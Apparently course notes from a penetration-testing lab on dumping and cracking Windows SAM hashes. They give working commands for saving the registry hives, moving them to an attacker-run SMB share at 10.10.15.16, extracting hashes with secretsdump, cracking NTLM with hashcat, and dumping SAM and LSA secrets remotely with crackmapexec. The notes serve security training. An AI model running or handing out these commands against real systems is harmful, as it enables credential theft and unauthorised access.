
dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline.


#### Copying SAM Registry Hives

Three registry hives from where we can gather hashes to crack if we have local admin access on the window host

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

#### Using reg.exe save to Copy Registry Hives

After running CMD.exe as admin

```cmd-session
reg.exe save hklm\sam C:\sam.save
```

```cmd-session
reg.exe save hklm\system C:\system.save
```

```cmd-session
reg.exe save hklm\security C:\security.save
```

Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts

#### Creating a Share with smbserver.py

On attacking machine:
```shell-session

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

On windows host:
```cmd-session
move sam.save \\10.10.15.16\CompData
```

```cmd-session
move security.save \\10.10.15.16\CompData
```

```cmd-session
move system.save \\10.10.15.16\CompData
```

---
## Dumping Hashes with Impacket's secretsdump.py

```shell-session
locate secretsdump 
```

```shell-session

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Most modern Windows operating systems store the password as an ***NT hash***. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.


---

## Cracking Hashes with Hashcat

#### Running Hashcat against NT Hashes

We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or the man page to see the supported hash types and their associated number.

```shell-session

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

-m 1000 to select the tyoe of hashes we are going to crack (NTLM in this case)


Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it. We can see some of these ways [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE attack framework.


---

## Remote Dumping & LSA Secrets Considerations

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

#### Dumping LSA Secrets Remotely

```shell-session

crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

